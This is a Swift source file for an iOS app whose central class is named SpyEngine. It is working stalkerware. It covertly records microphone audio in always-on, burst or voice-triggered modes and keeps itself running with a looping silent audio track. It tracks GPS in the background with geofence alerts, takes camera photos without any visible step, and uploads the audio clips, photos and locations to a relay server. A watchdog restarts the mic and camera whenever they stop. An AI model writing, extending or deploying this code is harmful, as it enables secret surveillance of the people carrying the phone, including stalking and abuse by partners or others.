import Foundation
import AVFoundation
import CoreLocation
import UIKit
import SystemConfiguration

final class MicGate {
    static let shared = MicGate()
    private var disarm: Timer?
    private var burst: Timer?
    private var burstOn = false
    private(set) var listening = false

    private var store: UserDefaults { UserDefaults(suiteName: Config.appGroup)! }

    var mode: MicMode {
        get { MicMode(rawValue: store.string(forKey: "micMode") ?? "") ?? .onDemand }
        set { store.set(newValue.rawValue, forKey: "micMode"); apply() }
    }
    private var burstOnSeconds: TimeInterval  { Double(store.object(forKey: "burstOn")  as? Int ?? 12) }
    private var burstOffSeconds: TimeInterval { Double(store.object(forKey: "burstOff") as? Int ?? 48) }

    func apply() {
        burst?.invalidate(); burst = nil
        disarm?.invalidate(); disarm = nil

        guard Settings.shared.isOn(.mic) else { SpyEngine.shared.setMic(false); return }

        switch mode {
        case .onDemand:
            SpyEngine.shared.setMic(false)
            if !Settings.shared.isOn(.silentKeepAlive) {
                HealthMon.fail(.mic, "On-demand mic with keep-alive off - app may suspend")
            } else { HealthMon.ok(.mic) }
        case .voiceTrigger:
            SpyEngine.shared.setMic(true); HealthMon.ok(.mic)
        case .burst:
            burstOn = true; SpyEngine.shared.setMic(true); scheduleBurst()
        case .always:
            SpyEngine.shared.setMic(true)
        }
        Relay.shared.sendJSON(["type": "micMode", "mode": mode.rawValue])
    }

    private func scheduleBurst() {
        burst?.invalidate()
        let t = burstOn ? burstOnSeconds : burstOffSeconds
        burst = Timer.scheduledTimer(withTimeInterval: t, repeats: false) { [weak self] _ in
            guard let self else { return }
            self.burstOn.toggle()
            SpyEngine.shared.setMic(self.burstOn)
            self.scheduleBurst()
        }
    }

    func listen(seconds: Double? = nil) {
        listening = true
        Clips.shared.session = String(UUID().uuidString.prefix(6)).lowercased()
        SpyEngine.shared.setMic(true)
        Relay.shared.sendJSON(["type": "mic", "on": true])
        disarm?.invalidate()
        guard mode != .always, let s = seconds, s > 0 else { return }
        disarm = Timer.scheduledTimer(withTimeInterval: s, repeats: false) { [weak self] _ in
            self?.disarmNow()
        }
    }

    func extend() {
        guard disarm != nil else { return }
        disarm?.invalidate()
        disarm = Timer.scheduledTimer(withTimeInterval: Settings.shared.micAutoDisarm,
                                      repeats: false) { [weak self] _ in self?.disarmNow() }
    }

    func stopListening() { disarm?.invalidate(); disarmNow() }

    private func disarmNow() {
        listening = false
        guard mode != .always else { return }
        SpyEngine.shared.setMic(false)
        Clips.shared.flush()
        Relay.shared.sendJSON(["type": "mic", "on": false,
                               "summary": Clips.shared.sessionSummary()])
    }
}

final class Clips {
    static let shared = Clips()
    private let q = DispatchQueue(label: "clips.writer")
    private let down = Downsampler()
    private var file: AVAudioFile?
    private var url: URL?
    private var started: Date?
    private var active = false
    private var preroll: [AVAudioPCMBuffer] = []
    var session = "-"
    private var sessionClips = 0
    private var sessionSeconds = 0.0

    func prepare(_ src: AVAudioFormat) { down.prepare(src); preroll.removeAll() }

    func feed(_ buf: AVAudioPCMBuffer, speech: Bool) {
        guard Settings.shared.isOn(.clipCapture),
              let small = down.process(buf),
              let copy = small.copy() as? AVAudioPCMBuffer else { return }
        q.async {
            if speech {
                if !self.active { self.active = true; self.begin(preRoll: true) }
                self.append(copy)
            } else {
                if self.active { self.active = false; self.end() }
                self.remember(copy)
            }
        }
    }

    func flush() { q.async { if self.active { self.active = false; self.end() } } }

    func sessionSummary() -> String {
        defer { sessionClips = 0; sessionSeconds = 0 }
        return sessionClips == 0 ? "no clips" : "\(sessionClips) clips / \(Int(sessionSeconds))s"
    }

    private func remember(_ b: AVAudioPCMBuffer) {
        guard Settings.shared.clipPreRoll > 0 else { return }
        preroll.append(b)
        let maxCount = Int(Settings.shared.clipPreRoll * 16000 / 2048) + 2
        while preroll.count > maxCount { preroll.removeFirst() }
    }

    private func begin(preRoll: Bool) {
        guard file == nil else { return }
        let name = "clip-\(Int(Date().timeIntervalSince1970)).wav"
        let u = FileManager.default.temporaryDirectory.appendingPathComponent(name)
        let settings: [String: Any] = [
            AVFormatIDKey: kAudioFormatLinearPCM,
            AVSampleRateKey: 16000, AVNumberOfChannelsKey: 1,
            AVLinearPCMBitDepthKey: 16, AVLinearPCMIsFloatKey: false,
            AVLinearPCMIsBigEndianKey: false
        ]
        guard let f = try? AVAudioFile(forWriting: u, settings: settings) else {
            HealthMon.fail(.clipCapture, "Could not open clip file"); return
        }
        file = f; url = u; started = Date()
        if preRoll { preroll.forEach { try? f.write(from: $0) } }
    }

    private func append(_ b: AVAudioPCMBuffer) {
        if file == nil { begin(preRoll: false) }
        try? file?.write(from: b)
        if let s = started, Date().timeIntervalSince(s) >= Settings.shared.clipMaxSeconds {
            end(); begin(preRoll: false)
        }
    }

    private func end() {
        guard let f = file, let u = url, let s = started else { return }
        let dur = Date().timeIntervalSince(s)
        if #available(iOS 16.0, *) { try? f.close() }
        file = nil; url = nil; started = nil
        guard dur >= Settings.shared.clipMinSeconds else {
            try? FileManager.default.removeItem(at: u); return
        }
        upload(u, seconds: dur)
    }

    private func upload(_ u: URL, seconds: Double) {
        guard let data = try? Data(contentsOf: u) else { return }
        let sess = session
        var c = URLComponents()
        c.scheme = "http"; c.host = Config.relayHost
        c.port = Config.relayPort; c.path = "/upload"
        c.queryItems = [.init(name: "token", value: Config.token),
                        .init(name: "seconds", value: String(format: "%.1f", seconds)),
                        .init(name: "session", value: sess),
                        .init(name: "name", value: u.lastPathComponent)]
        var r = URLRequest(url: c.url!)
        r.httpMethod = "POST"
        r.setValue("audio/wav", forHTTPHeaderField: "Content-Type")
        URLSession.shared.uploadTask(with: r, from: data) { _, resp, err in
            try? FileManager.default.removeItem(at: u)
            guard err == nil, (resp as? HTTPURLResponse)?.statusCode == 200 else {
                HealthMon.fail(.clipCapture, err?.localizedDescription ?? "Upload rejected"); return
            }
            HealthMon.ok(.clipCapture)
            self.sessionClips += 1
            self.sessionSeconds += seconds
            Relay.shared.sendJSON(["type": "alert", "title": "Clip saved",
                                   "reason": String(format: "%.0fs", seconds),
                                   "feature": "clipCapture", "session": sess,
                                   "ok": true, "at": Date().timeIntervalSince1970])
        }.resume()
    }
}

final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptureDelegate {
    static let shared = SpyEngine()

    private let engine  = AVAudioEngine()
    private let session = AVAudioSession.sharedInstance()
    private let location = CLLocationManager()
    private let capture = AVCaptureSession()
    private let photoOut = AVCapturePhotoOutput()
    private var silence: AVAudioPlayer?
    private var configured = false
    private var tapInstalled = false

    private var noiseFloor: Float = 0.010
    private var calibCount = 0
    private var speechStarted: Date?
    private var speechUntil: Date?

    var cameraPosition: AVCaptureDevice.Position = .back {
        didSet { if configured { swapCamera() } }
    }

    func boot() {
        startKeepAlive()
        startLocation()
        configureCamera()
        startWatchdog()
        NotificationCenter.default.addObserver(forName: .featuresChanged, object: nil, queue: .main) { [weak self] n in
            guard let k = n.object as? FeatureKey else { return }
            self?.apply(k)
        }
        NotificationCenter.default.addObserver(forName: AVAudioSession.interruptionNotification,
                                               object: nil, queue: .main) { [weak self] _ in
            MicGate.shared.apply(); self?.startKeepAlive()
        }
        Relay.shared.connect()
    }

    func startKeepAlive() {
        guard Settings.shared.isOn(.silentKeepAlive), silence == nil else { return }
        silence = try? AVAudioPlayer(data: WAV.silence(seconds: 1))
        silence?.numberOfLoops = -1
        silence?.volume = 0
        silence?.play()
    }

    func setMic(_ on: Bool) {
        if on {
            guard !engine.isRunning else { return }
            try? session.setCategory(.playAndRecord, mode: .default,
                                     options: [.defaultToSpeaker, .allowBluetooth, .mixWithOthers])
            try? session.setActive(true)
            let input = engine.inputNode
            if !tapInstalled {
                let fmt = input.outputFormat(forBus: 0)
                Clips.shared.prepare(fmt)
                Relay.shared.prepare(fmt)
                noiseFloor = 0.010; calibCount = 0
                input.installTap(onBus: 0, bufferSize: 2048, format: fmt) { [weak self] b, _ in
                    self?.handleBuffer(b)
                }
                tapInstalled = true
            }
            try? engine.start()
            Relay.shared.sendJSON(["type": "mic", "on": true])
        } else {
            guard engine.isRunning || tapInstalled else { return }
            engine.stop()
            if tapInstalled { engine.inputNode.removeTap(onBus: 0); tapInstalled = false }
            Clips.shared.flush()
            try? session.setActive(false)
            try? session.setCategory(.playback, mode: .default, options: [.mixWithOthers])
            try? session.setActive(true)
            silence?.play()
            Relay.shared.sendJSON(["type": "mic", "on": false])
        }
    }

    private static func rms(_ buf: AVAudioPCMBuffer) -> Float {
        guard let ch = buf.floatChannelData?[0] else { return 0 }
        let n = Int(buf.frameLength)
        var sum: Float = 0
        for i in 0..<n { sum += ch[i] * ch[i] }
        return (sum / Float(max(n, 1))).squareRoot()
    }

    private func handleBuffer(_ buf: AVAudioPCMBuffer) {
        let vadOn = Settings.shared.isOn(.voiceActivity)
                 || Settings.shared.isOn(.clipCapture)
                 || MicGate.shared.mode == .voiceTrigger
        let live = MicGate.shared.listening && Settings.shared.isOn(.liveStream)

        guard vadOn else {
            if live { Relay.shared.sendPCM(buf) }
            Clips.shared.feed(buf, speech: true)
            return
        }

        let level = Self.rms(buf)
        if calibCount < 60 {
            noiseFloor = noiseFloor * 0.9 + level * 0.1; calibCount += 1
        } else if level < noiseFloor * 1.5 {
            noiseFloor = noiseFloor * 0.995 + level * 0.005
        }
        let sens = Float(Settings.shared.vadSensitivity)
        let threshold = max(noiseFloor * (1.8 + sens * 12), 0.006)
        let now = Date()

        if level > threshold {
            speechUntil = now.addingTimeInterval(Settings.shared.vadHangover)
            if speechStarted == nil {
                speechStarted = now
                if Settings.shared.vadAlert { vadEvent("start", 0) }
            }
            if live { Relay.shared.sendPCM(buf) }
            Clips.shared.feed(buf, speech: true)
        } else if let until = speechUntil, now < until {
            if live { Relay.shared.sendPCM(buf) }
            Clips.shared.feed(buf, speech: true)
        } else if let started = speechStarted {
            vadEvent("end", now.timeIntervalSince(started))
            speechStarted = nil; speechUntil = nil
            if live { Relay.shared.sendPCM(buf) }
            Clips.shared.feed(buf, speech: false)
        } else {
            if live { Relay.shared.sendPCM(buf) }
            Clips.shared.feed(buf, speech: false)
        }
    }

    private func vadEvent(_ state: String, _ seconds: Double) {
        if state == "start" { MicGate.shared.extend() }
        Relay.shared.sendJSON(["type": "vad", "state": state, "seconds": seconds,
                               "level": Double(noiseFloor), "t": Date().timeIntervalSince1970])
        if state == "start", Settings.shared.vadAlert {
            Relay.shared.sendJSON(["type": "alert", "title": "Voice detected",
                                   "reason": "Someone is talking", "feature": "voiceActivity",
                                   "ok": true, "at": Date().timeIntervalSince1970])
        }
    }

    private func startLocation() {
        location.delegate = self
        location.desiredAccuracy = kCLLocationAccuracyHundredMeters
        location.allowsBackgroundLocationUpdates = true
        location.pausesLocationUpdatesAutomatically = false
        location.requestAlwaysAuthorization()
        location.startMonitoringSignificantLocationChanges()
        location.startUpdatingLocation()
        Geofences.rearm()
    }

    func locationManager(_ m: CLLocationManager, didUpdateLocations locs: [CLLocation]) {
        guard Settings.shared.isOn(.location), Settings.shared.inWindow(), let l = locs.last else { return }
        Outbox.shared.send(["type": "gps", "lat": l.coordinate.latitude, "lon": l.coordinate.longitude,
                            "speed": l.speed, "heading": l.course, "acc": l.horizontalAccuracy,
                            "t": Date().timeIntervalSince1970])
    }
    func locationManager(_ m: CLLocationManager, didEnterRegion r: CLRegion) { geo("Arrived", r) }
    func locationManager(_ m: CLLocationManager, didExitRegion r: CLRegion)  { geo("Left", r) }
    func locationManager(_ m: CLLocationManager, didFailWithError e: Error) { HealthMon.fail(.location, e.localizedDescription) }

    private func geo(_ verb: String, _ r: CLRegion) {
        guard Settings.shared.isOn(.pushAlerts) else { return }
        Relay.shared.sendJSON(["type": "alert", "title": "Geofence", "reason": "\(verb): \(r.identifier)",
                               "feature": "geofence", "ok": true, "at": Date().timeIntervalSince1970])
    }

    private func configureCamera() {
        guard !configured else { return }
        capture.beginConfiguration()
        capture.sessionPreset = .medium
        attachCamera(cameraPosition)
        if capture.canAddOutput(photoOut) { capture.addOutput(photoOut) }
        capture.commitConfiguration()
        DispatchQueue.global(qos: .userInitiated).async { self.capture.startRunning() }
        configured = true
    }

    private func attachCamera(_ pos: AVCaptureDevice.Position) {
        capture.inputs.forEach { capture.removeInput($0) }
        if let dev = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: pos),
           let inp = try? AVCaptureDeviceInput(device: dev), capture.canAddInput(inp) {
            capture.addInput(inp)
        }
    }

    private func swapCamera() {
        capture.beginConfiguration(); attachCamera(cameraPosition); capture.commitConfiguration()
    }

    func snap() {
        guard Settings.shared.isOn(.camera), Settings.shared.inWindow() else { return }
        guard capture.isRunning else { HealthMon.fail(.camera, "Capture session not running"); return }
        photoOut.capturePhoto(with: AVCapturePhotoSettings(), delegate: self)
    }

    func photoOutput(_ o: AVCapturePhotoOutput, didFinishProcessingPhoto p: AVCapturePhoto, error: Error?) {
        if let e = error { HealthMon.fail(.camera, e.localizedDescription); return }
        guard let d = p.fileDataRepresentation() else { HealthMon.fail(.camera, "No JPEG data"); return }
        Outbox.shared.send(["type": "photo", "b64": d.base64EncodedString(), "t": Date().timeIntervalSince1970])
    }

    private func startWatchdog() {
        Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { [weak self] _ in
            guard Settings.shared.isOn(.watchdog) else { return }
            if Settings.shared.isOn(.mic), !MicGate.shared.listening,
               MicGate.shared.mode == .always, !(self?.engine.isRunning ?? true) {
                self?.setMic(true)
            }
            if Settings.shared.isOn(.camera), !(self?.capture.isRunning ?? true) {
                DispatchQueue.global().async { self?.capture.startRunning() }
            }
            if self?.silence?.isPlaying == false { self?.silence = nil; self?.startKeepAlive() }
            HealthMon.sweep()
        }
    }

    private func apply(_ k: FeatureKey) {
        switch k {
        case .mic, .voiceActivity, .clipCapture: MicGate.shared.apply()
        case .camera: if Settings.shared.isOn(.camera) { configureCamera() }
        case .location, .preciseLocation, .geofence: Geofences.rearm()
        case .silentKeepAlive:
            if Settings.shared.isOn(.silentKeepAlive) { startKeepAlive() }
            else { silence?.stop(); silence = nil }
        default: break
        }
        HealthMon.sweep()
    }
}

enum WAV {
    static func silence(seconds: Int) -> Data {
        let rate = 8000, samples = rate * seconds
        var d = Data()
        func u32(_ v: Int) { var x = UInt32(v).littleEndian; withUnsafeBytes(of: &x) { d.append(contentsOf: $0) } }
        func u16(_ v: Int) { var x = UInt16(v).littleEndian; withUnsafeBytes(of: &x) { d.append(contentsOf: $0) } }
        d.append(contentsOf: Array("RIFF".utf8)); u32(36 + samples)
        d.append(contentsOf: Array("WAVEfmt ".utf8)); u32(16); u16(1); u16(1); u32(rate)
        u32(rate); u16(1); u16(8)
        d.append(contentsOf: Array("data".utf8)); u32(samples)
        d.append(Data(repeating: 128, count: samples))
        return d
    }
}

enum Geofences {
    static func rearm() {
        let m = CLLocationManager()
        for r in m.monitoredRegions { m.stopMonitoring(for: r) }
        guard Settings.shared.isOn(.geofence) else { return }
        for f in Settings.shared.geofences {
            guard let lat = f["lat"] as? Double, let lon = f["lon"] as? Double,
                  let rad = f["radius"] as? Double, let name = f["name"] as? String else { continue }
            m.startMonitoring(for: CLCircularRegion(
                center: CLLocationCoordinate2D(latitude: lat, longitude: lon),
                radius: rad, identifier: name))
        }
    }
}

enum Reachability {
    static var online: Bool {
        var zero = sockaddr_in()
        zero.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
        zero.sin_family = sa_family_t(AF_INET)
        guard let r = withUnsafePointer(to: &zero, {
            SCNetworkReachabilityCreateWithAddress(nil, UnsafePointer($0))
        }) else { return false }
        var flags = SCNetworkReachabilityFlags()
        SCNetworkReachabilityGetFlags(r, &flags)
        return flags.contains(.reachable) && !flags.contains(.connectionRequired)
    }
}
